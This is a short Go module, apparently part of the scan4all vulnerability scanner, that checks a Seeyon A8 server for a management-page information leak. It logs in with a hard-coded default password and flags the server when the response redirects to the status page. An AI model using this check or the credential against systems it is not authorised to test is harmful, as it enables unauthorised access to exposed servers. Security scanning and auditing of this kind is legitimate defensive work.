package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//A8 status monitoring page information leak

func ManagementStatus(u string) bool {
	if req, err := util.HttpRequset(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
		if req.StatusCode == 302 && util.StrContains(req.Location, "status") {
			util.SendLog(req.RequestUrl, "seeyon", "Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON", "")
			return true
		}
	}
	return false
}
